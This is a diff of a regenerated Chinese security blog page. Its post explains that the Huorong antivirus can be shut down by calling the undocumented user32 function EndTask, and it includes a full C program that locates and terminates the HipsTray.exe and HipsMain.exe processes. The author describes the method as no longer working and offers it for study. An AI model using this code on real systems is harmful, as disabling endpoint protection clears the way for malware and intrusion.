@@ -47,7 +47,7 @@
 <meta property="og:image" content="http://mamor5409.github.io/posts/3fe86fb6/4.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/3fe86fb6/5.png">
 <meta property="article:published_time" content="2022-12-11T01:35:18.000Z">
-<meta property="article:modified_time" content="2022-12-11T01:50:00.323Z">
+<meta property="article:modified_time" content="2022-12-11T01:50:00.000Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="Bypass">
 <meta name="twitter:card" content="summary">
@@ -298,16 +298,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>一般杀毒软件会对关键函数挂钩，火绒虽然没有对底层 api 进行挂钩，但是火绒通过 windows 回调来监控整个系统。</p>
+        <p>一般杀毒软件会对关键函数挂钩，火绒虽然没有对底层 api
+进行挂钩，但是火绒通过 windows 回调来监控整个系统。</p>
 <p>在任务管理器中可以看到火绒有三个进程</p>
-<p><code>HipsDEaemon. exe </code>  后台守护进程</p>
+<p><code>HipsDEaemon. exe</code> 后台守护进程</p>
 <p><img src="/posts/3fe86fb6/1.png"></p>
-<p><code>HipsMain. exe</code>  主界面<br><img src="/posts/3fe86fb6/2.png"></p>
-<p><code>HipsTray. exe</code> 托盘程序<br><img src="/posts/3fe86fb6/3..png"><br>使用 penProcess 和 TerminateProcess 是无法将进程关闭的，火绒的系统回调会监控到 openprocess。但是可以通过一个未导出函数 EndTask 函数进行关闭，该函数并没有被其挂钩进行监控。<br>使用processhacker查看csrss.exe 看到HipsTray的权限为全部<br><img src="/posts/3fe86fb6/4.png"><br>如果把火绒的托盘程序杀掉后 守护程序会放行所以操作<br>不过该方法现在已经用不了了 只作为一种学习思路学习下<br><img src="/posts/3fe86fb6/5.png"></p>
+<p><code>HipsMain. exe</code> 主界面 <img src="/posts/3fe86fb6/2.png"></p>
+<p><code>HipsTray. exe</code> 托盘程序 <img src="/posts/3fe86fb6/3..png"> 使用
+penProcess 和 TerminateProcess
+是无法将进程关闭的，火绒的系统回调会监控到
+openprocess。但是可以通过一个未导出函数 EndTask
+函数进行关闭，该函数并没有被其挂钩进行监控。
+使用processhacker查看csrss.exe 看到HipsTray的权限为全部 <img src="/posts/3fe86fb6/4.png"> 如果把火绒的托盘程序杀掉后 守护程序会放行所以操作
+不过该方法现在已经用不了了 只作为一种学习思路学习下 <img src="/posts/3fe86fb6/5.png"></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI *pEndTask)</span><span class="params">(HWND hWnd, BOOL fShutDown, BOOL fForce)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HWND <span class="title function_">GetXHandle</span><span class="params">(LPCWSTR procName)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD iProcID = <span class="number">0</span>;</span><br><span class="line">	PROCESSENTRY32 pEntry = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"></span><br><span class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (Process32First(hSnapshot, &amp;pEntry))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pEntry))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (lstrcmpi(procName, pEntry.szExeFile) == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					iProcID = pEntry.th32ProcessID;</span><br><span class="line">					CloseHandle(hSnapshot);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HWND hwnd = GetTopWindow(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">while</span> (hwnd)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD pid = <span class="number">0</span>;</span><br><span class="line">		DWORD dwProcessId = GetWindowThreadProcessId(hwnd, &amp;pid);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dwProcessId != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pid == iProcID)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> hwnd;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 16336);</span></span><br><span class="line">	<span class="comment">//TerminateProcess(hProcess, 0);</span></span><br><span class="line"></span><br><span class="line">	HMODULE hModule = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	pEndTask endTask = (pEndTask)GetProcAddress(hModule, <span class="string">&quot;EndTask&quot;</span>);</span><br><span class="line">	HWND hwnd = GetXHandle(<span class="string">L&quot;HipsTray.exe&quot;</span>);</span><br><span class="line">	endTask(hwnd, FALSE, <span class="number">1</span>);</span><br><span class="line">	hwnd = GetXHandle(<span class="string">L&quot;HipsMain.exe&quot;</span>);</span><br><span class="line">	endTask(hwnd, FALSE, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>csrss.exe</p>
-<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a target="_blank" rel="noopener" href="https://czm23333.github.io/2021/11/07/C-Windows-%E7%A6%81%E7%94%A8%E7%81%AB%E7%BB%92%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/">https://czm23333.github.io/2021/11/07/C-Windows-%E7%A6%81%E7%94%A8%E7%81%AB%E7%BB%92%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/</a></p>
+<h4 id="references">References</h4>
+<p>https://czm23333.github.io/2021/11/07/C-Windows-%E7%A6%81%E7%94%A8%E7%81%AB%E7%BB%92%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/</p>
 
     </div>
 
@@ -437,7 +444,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#References"><span class="nav-number">1.</span> <span class="nav-text">References</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#references"><span class="nav-number">1.</span> <span class="nav-text">References</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -453,7 +460,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -501,7 +508,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -515,7 +522,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -526,7 +533,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -666,6 +673,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
